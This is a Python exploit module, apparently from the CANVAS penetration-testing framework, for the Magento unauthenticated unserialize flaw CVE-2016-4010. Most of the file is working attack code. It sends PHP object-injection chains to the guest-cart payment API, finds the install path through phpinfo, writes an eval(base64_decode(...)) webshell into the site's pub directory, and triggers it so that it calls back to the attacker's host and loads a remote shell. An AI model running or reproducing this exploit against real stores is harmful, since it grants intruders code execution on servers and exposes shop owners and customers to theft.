#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#http://www.immunityinc.com/CANVAS/ for more information

# python imports
import sys
import base64
import string

# path appends
if '.' not in sys.path:
    sys.path.append('.')

# CANVAS imports
from exploitutils import *
from tcpexploit import tcpexploit
import canvasengine
import phplistener

NAME                            = "Magento unauthenticated unserialize < 2.0.6"
DESCRIPTION                     = "Magento unauthenticated unserialize < 2.0.6"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Magento"
DOCUMENTATION["Repeatability"]  = "Infinite"
DOCUMENTATION["CVE Name"]       = "CVE-2016-4010"
DOCUMENTATION["CVE Url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4010"

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Web Exploits"
PROPERTY['SITE']                = "Remote"
PROPERTY['ARCH']                = [ ["Linux", "Windows"] ]
PROPERTY['VERSION']             = [ "< 2.0.6" ]

NOTES = """
Pre-Auth unauthenticated unserialize. The target site needs to have the checkout without login option enabled.
To run this exploit you need to provide a valid:
    * Magento installation path (optional, see below)
    * A valid guestCartId, see below how to get a valid guestCardId
    * The magento basepath on the server for example in http://127.0.0.1/sarasa/magento/ you need to provide /sarasa/magento/.

** Magento installation path **
The exploit will try to get the magento installation directory by exploting the unserialize and running phpinfo.
If phpinfo is disabled the exploit will fail and the user will need to enter this path manually and re-run the exploit.

** To get a valid guestCartId **
    1) Add an item in your cart
    2) Go to Checkout
    3) Fill the form and look at the POST request to /rest/default/V1/guest-carts/<guestCartId>/shipping-information
    4) Use the guestCartId provided in that POST request.
"""


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port = ""
        self.host = ""
        self.done = 0
        self.name = NAME
        self.basepath = "/"
        self.magento_path = ""
        self.cart_id = ""

    def usage(self):
        logging.info("Base options:")
        logging.info("-v <version> -t <target ip> -l <callback ip> -d <callback port>")
        logging.info("-O basepath:basepath -O port:port -O magento_path:magento_path -O cart_id:cart_id")
        return

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))

        self.basepath = self.argsDict.get("basepath", self.basepath)
        self.user_provided_magento_path = self.argsDict.get("magento_path",
                                                            self.magento_path)
        self.cart_id  = self.argsDict.get("cart_id", self.cart_id)

        if not all([self.basepath, self.port, self.cart_id]):
            logging.warning("Missing arguments")
            self.usage()
            return False

        return True

    def neededListenerTypes(self):
        return [canvasengine.PHPMULTI]

    def run(self):
        if not self.getargs():
            return False

        status_string = "{0} attacking {1}:{2}".format(NAME, self.host, self.port)

        logging.info("{0} (in progress)".format(status_string))
        logging.info("Basepath: {0}".format(self.basepath))
        logging.info('Magento_path: {0}'.format(self.magento_path))
        logging.info('Cart_id={0}'.format(self.cart_id))

        self.magento_path = self.get_magento_path()
        if self.magento_path is None:
            logging.error("Magento path not found")
            logging.error("Run the exploit again providing one")
            logging.error("Bailing")

        if not self.exploit_unserialize():
            return False

        self.trigger()

        ret = self.ISucceeded()
        if ret:
            logging.info("{0} (sucess!)".format(status_string))
        else:
            logging.info("{0} (failed)".format(status_string))

        return ret

    def get_magento_path(self):
        magento_path_phpinfo = self.get_magento_path_from_phpinfo()

        if magento_path_phpinfo:
            return magento_path_phpinfo
        else:
            if self.user_provided_magento_path:
                return self.user_provided_magento_path
            else:
                return None

    def get_magento_path_from_phpinfo(self):
        phpinfo_pop_chain = '{"paymentMethod":{"method":"checkmo","additional_data":{"additional_information":"O:13:\\"Credis_Client\\":22:{s:8:\\"\u0000*\u0000redis\\";O:45:\\"Magento\\\\Sales\\\\Model\\\\Order\\\\Payment\\\\Transaction\\":40:{s:9:\\"\u0000*\u0000_order\\";N;s:21:\\"\u0000*\u0000_parentTransaction\\";N;s:12:\\"\u0000*\u0000_children\\";N;s:22:\\"\u0000*\u0000_identifiedChildren\\";N;s:27:\\"\u0000*\u0000_transactionsAutoLinking\\";b:1;s:14:\\"\u0000*\u0000_isFailsafe\\";b:1;s:12:\\"\u0000*\u0000_hasChild\\";N;s:15:\\"\u0000*\u0000_eventPrefix\\";s:31:\\"sales_order_payment_transaction\\";s:15:\\"\u0000*\u0000_eventObject\\";s:25:\\"order_payment_transaction\\";s:18:\\"\u0000*\u0000_orderWebsiteId\\";N;s:16:\\"\u0000*\u0000_orderFactory\\";N;s:15:\\"\u0000*\u0000_dateFactory\\";N;s:22:\\"\u0000*\u0000_transactionFactory\\";N;s:25:\\"\u0000*\u0000orderPaymentRepository\\";N;s:18:\\"\u0000*\u0000orderRepository\\";N;s:29:\\"\u0000*\u0000extensionAttributesFactory\\";N;s:22:\\"\u0000*\u0000extensionAttributes\\";N;s:25:\\"\u0000*\u0000customAttributeFactory\\";N;s:24:\\"\u0000*\u0000customAttributesCodes\\";N;s:26:\\"\u0000*\u0000customAttributesChanged\\";b:0;s:15:\\"\u0000*\u0000_idFieldName\\";s:2:\\"id\\";s:18:\\"\u0000*\u0000_hasDataChanges\\";b:0;s:12:\\"\u0000*\u0000_origData\\";N;s:13:\\"\u0000*\u0000_isDeleted\\";b:0;s:12:\\"\u0000*\u0000_resource\\";O:32:\\"Magento\\\\Framework\\\\DB\\\\Transaction\\":3:{s:11:\\"\u0000*\u0000_objects\\";a:0:{}s:18:\\"\u0000*\u0000_objectsByAlias\\";a:0:{}s:25:\\"\u0000*\u0000_beforeCommitCallbacks\\";a:1:{i:0;s:7:\\"phpinfo\\";}}s:22:\\"\u0000*\u0000_resourceCollection\\";N;s:16:\\"\u0000*\u0000_resourceName\\";N;s:18:\\"\u0000*\u0000_collectionName\\";N;s:12:\\"\u0000*\u0000_cacheTag\\";b:0;s:19:\\"\u0000*\u0000_dataSaveAllowed\\";b:1;s:15:\\"\u0000*\u0000_isObjectNew\\";N;s:23:\\"\u0000*\u0000_validatorBeforeSave\\";N;s:16:\\"\u0000*\u0000_eventManager\\";N;s:16:\\"\u0000*\u0000_cacheManager\\";N;s:12:\\"\u0000*\u0000_registry\\";N;s:10:\\"\u0000*\u0000_logger\\";N;s:12:\\"\u0000*\u0000_appState\\";N;s:19:\\"\u0000*\u0000_actionValidator\\";N;s:13:\\"\u0000*\u0000storedData\\";a:0:{}s:8:\\"\u0000*\u0000_data\\";a:0:{}}s:13:\\"\u0000*\u0000redisMulti\\";N;s:7:\\"\u0000*\u0000host\\";N;s:7:\\"\u0000*\u0000port\\";N;s:10:\\"\u0000*\u0000timeout\\";N;s:14:\\"\u0000*\u0000readTimeout\\";N;s:13:\\"\u0000*\u0000persistent\\";N;s:18:\\"\u0000*\u0000closeOnDestruct\\";b:1;s:12:\\"\u0000*\u0000connected\\";b:1;s:13:\\"\u0000*\u0000standalone\\";N;s:20:\\"\u0000*\u0000maxConnectRetries\\";i:0;s:18:\\"\u0000*\u0000connectFailures\\";i:0;s:14:\\"\u0000*\u0000usePipeline\\";b:0;s:15:\\"\u0000*\u0000commandNames\\";N;s:11:\\"\u0000*\u0000commands\\";N;s:10:\\"\u0000*\u0000isMulti\\";b:0;s:13:\\"\u0000*\u0000isWatching\\";b:0;s:15:\\"\u0000*\u0000authPassword\\";N;s:13:\\"\u0000*\u0000selectedDb\\";i:0;s:17:\\"\u0000*\u0000wrapperMethods\\";a:3:{s:6:\\"delete\\";s:3:\\"del\\";s:7:\\"getkeys\\";s:4:\\"keys\\";s:7:\\"sremove\\";s:4:\\"srem\\";}s:18:\\"\u0000*\u0000renamedCommands\\";N;s:11:\\"\u0000*\u0000requests\\";i:0;}"}},"email":"valid@magento.com"}'

        phpinfo = self.make_post_request(phpinfo_pop_chain)
        if '500' in phpinfo:
            # Try again
            phpinfo = self.make_post_request(phpinfo_pop_chain)

        # phpinfo might be disabled or the exploit failed
        if 'SCRIPT_FILENAME' in phpinfo:
            return self.parse_magento_path_from_phpinfo(phpinfo)

    def make_post_request(self, data):
        socket = self.create_socket()
        if socket is None:
            return None

        post_url = '{0}/rest/V1/guest-carts/{1}/set-payment-information'.format(self.basepath,
                                                                                self.cart_id)
        raw_request  = "POST {0} HTTP/1.1\r\n".format(post_url)
        raw_request += "Host: {0}\r\n".format(self.host)
        raw_request += "Accept: */*\r\n"
        raw_request += "Content-Type: application/json\r\n"
        raw_request += "Content-Length: {0}\r\n".format(len(data))
        raw_request += "Expect: 100-continue\r\n\r\n"

        self.websend(socket, raw_request)
        received_data = self.webrecv(socket, size=5000)

        if 'Continue' not in received_data:
            logging.info("The site is probably not running Magento")
            return None

        self.websend(socket, data + "\r\n\r\n")
        response = ''
        received_data = self.webrecv(socket, size=5000)

        while received_data:
            response += received_data
            received_data = self.webrecv(socket, size=5000)
        return response

    def parse_magento_path_from_phpinfo(self, phpinfo):
        magento_path_start = phpinfo.find('SCRIPT_FILENAME')
        magento_path_start = phpinfo.find('</td>', magento_path_start) + 5
        magento_path_start = phpinfo.find('>', magento_path_start) + 1
        magento_path_end = phpinfo.find('</td>', magento_path_start)

        if (magento_path_end < 0 or
            magento_path_start < 0 or
            magento_path_start >= magento_path_end):
            logging.error('Failed parsing the magento path from phpinfo()')
            logging.error('Run the exploit again providing a valid magento_path')
            return None

        magento_path = phpinfo[magento_path_start:magento_path_end].strip()
        return os.path.dirname(magento_path)

    def exploit_unserialize(self):
        write_pop_chain = '{"paymentMethod":{"method":"checkmo","additional_data":{"additional_information":"O:13:\\"Credis_Client\\":22:{s:8:\\"\u0000*\u0000redis\\";O:45:\\"Magento\\\\Sales\\\\Model\\\\Order\\\\Payment\\\\Transaction\\":40:{s:9:\\"\u0000*\u0000_order\\";N;s:21:\\"\u0000*\u0000_parentTransaction\\";N;s:12:\\"\u0000*\u0000_children\\";N;s:22:\\"\u0000*\u0000_identifiedChildren\\";N;s:27:\\"\u0000*\u0000_transactionsAutoLinking\\";b:1;s:14:\\"\u0000*\u0000_isFailsafe\\";b:1;s:12:\\"\u0000*\u0000_hasChild\\";N;s:15:\\"\u0000*\u0000_eventPrefix\\";s:31:\\"sales_order_payment_transaction\\";s:15:\\"\u0000*\u0000_eventObject\\";s:25:\\"order_payment_transaction\\";s:18:\\"\u0000*\u0000_orderWebsiteId\\";N;s:16:\\"\u0000*\u0000_orderFactory\\";N;s:15:\\"\u0000*\u0000_dateFactory\\";N;s:22:\\"\u0000*\u0000_transactionFactory\\";N;s:25:\\"\u0000*\u0000orderPaymentRepository\\";N;s:18:\\"\u0000*\u0000orderRepository\\";N;s:29:\\"\u0000*\u0000extensionAttributesFactory\\";N;s:22:\\"\u0000*\u0000extensionAttributes\\";N;s:25:\\"\u0000*\u0000customAttributeFactory\\";N;s:24:\\"\u0000*\u0000customAttributesCodes\\";N;s:26:\\"\u0000*\u0000customAttributesChanged\\";b:0;s:15:\\"\u0000*\u0000_idFieldName\\";s:2:\\"id\\";s:18:\\"\u0000*\u0000_hasDataChanges\\";b:0;s:12:\\"\u0000*\u0000_origData\\";N;s:13:\\"\u0000*\u0000_isDeleted\\";b:0;s:12:\\"\u0000*\u0000_resource\\";O:45:\\"Magento\\\\Framework\\\\Simplexml\\\\Config\\\\Cache\\\\File\\":1:{s:8:\\"\u0000*\u0000_data\\";a:3:{s:18:\\"is_allowed_to_save\\";b:1;s:14:\\"stat_file_name\\";s:%d:\\"%s\\";s:10:\\"components\\";s:%d:\\"%s\\";}}s:22:\\"\u0000*\u0000_resourceCollection\\";N;s:16:\\"\u0000*\u0000_resourceName\\";N;s:18:\\"\u0000*\u0000_collectionName\\";N;s:12:\\"\u0000*\u0000_cacheTag\\";b:0;s:19:\\"\u0000*\u0000_dataSaveAllowed\\";b:1;s:15:\\"\u0000*\u0000_isObjectNew\\";N;s:23:\\"\u0000*\u0000_validatorBeforeSave\\";N;s:16:\\"\u0000*\u0000_eventManager\\";N;s:16:\\"\u0000*\u0000_cacheManager\\";N;s:12:\\"\u0000*\u0000_registry\\";N;s:10:\\"\u0000*\u0000_logger\\";N;s:12:\\"\u0000*\u0000_appState\\";N;s:19:\\"\u0000*\u0000_actionValidator\\";N;s:13:\\"\u0000*\u0000storedData\\";a:0:{}s:8:\\"\u0000*\u0000_data\\";a:0:{}}s:13:\\"\u0000*\u0000redisMulti\\";N;s:7:\\"\u0000*\u0000host\\";N;s:7:\\"\u0000*\u0000port\\";N;s:10:\\"\u0000*\u0000timeout\\";N;s:14:\\"\u0000*\u0000readTimeout\\";N;s:13:\\"\u0000*\u0000persistent\\";N;s:18:\\"\u0000*\u0000closeOnDestruct\\";b:1;s:12:\\"\u0000*\u0000connected\\";b:1;s:13:\\"\u0000*\u0000standalone\\";N;s:20:\\"\u0000*\u0000maxConnectRetries\\";i:0;s:18:\\"\u0000*\u0000connectFailures\\";i:0;s:14:\\"\u0000*\u0000usePipeline\\";b:0;s:15:\\"\u0000*\u0000commandNames\\";N;s:11:\\"\u0000*\u0000commands\\";N;s:10:\\"\u0000*\u0000isMulti\\";b:0;s:13:\\"\u0000*\u0000isWatching\\";b:0;s:15:\\"\u0000*\u0000authPassword\\";N;s:13:\\"\u0000*\u0000selectedDb\\";i:0;s:17:\\"\u0000*\u0000wrapperMethods\\";a:3:{s:6:\\"delete\\";s:3:\\"del\\";s:7:\\"getkeys\\";s:4:\\"keys\\";s:7:\\"sremove\\";s:4:\\"srem\\";}s:18:\\"\u0000*\u0000renamedCommands\\";N;s:11:\\"\u0000*\u0000requests\\";i:0;}"}},"email":"valid@magento.com"}'

        upload_path, escaped_upload_path = self.get_path_for_uploading()
        self.upload_path = upload_path
        payload = self.get_payload()

        logging.info("Writing file to {0}".format(upload_path))
        post_data = write_pop_chain % (len(upload_path), escaped_upload_path,
                                       len(payload), payload)

        return self.make_post_request(post_data)

    def get_payload(self):
        encoded_mosdef = base64.b64encode(self.get_php_to_mosdef())
        payload = r"<?php eval(base64_decode('{0}')); ?>".format(encoded_mosdef)
        return payload

    def get_path_for_uploading(self):
        random_name = self.get_random_name()
        write_path = os.path.join(self.magento_path, 'pub', random_name)
        escaped_write_path = write_path.replace('/', '\/')
        return write_path, escaped_write_path

    def get_random_name(self):
        characters = string.ascii_uppercase + string.digits
        random_list_of_characters = [random.choice(characters) for _ in range(4)]
        random_name = '{0}.php'.format(''.join(random_list_of_characters))
        return random_name

    def trigger(self):
        socket = self.create_socket()
        magento_start = self.upload_path.find('/magento')
        mosdef_shell_path = self.upload_path[magento_start:]

        logging.info("Triggering MOSDEF on %s" % mosdef_shell_path)

        raw_request  = "GET {0} HTTP/1.1\r\n".format(mosdef_shell_path)
        raw_request += "Host: {0}\r\n".format(self.host)
        raw_request += '\r\n\r\n'
        self.websend(socket, raw_request)
        response = ''
        received_data = self.webrecv(socket, size=5000)

        while received_data:
            response += received_data
            received_data = self.webrecv(socket, size=5000)
        return response

    def create_socket(self):
        socket = self.gettcpsock()
        try:
            socket.connect((self.host, self.port))
        except:
            logging.error("Cannot connect to {0}:{1}\n".format(self.host, self.port))
            return None

        return socket

    def get_php_to_mosdef(self):
        """
        Creates a string which when included in php's eval() will download and execute
        MOSDEF
        """
        localhost = self.callback.ip
        localport = self.callback.port
        logging.info("Using PHPMULTI callback of {0}:{1}".format(localhost, localport))

        badchars = ""

        return phplistener.get_php_stage1(badchars, localhost, localport)


if __name__ == '__main__':
    logging.info("Running CANVAS {0} Exploit v {1}".format(DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)

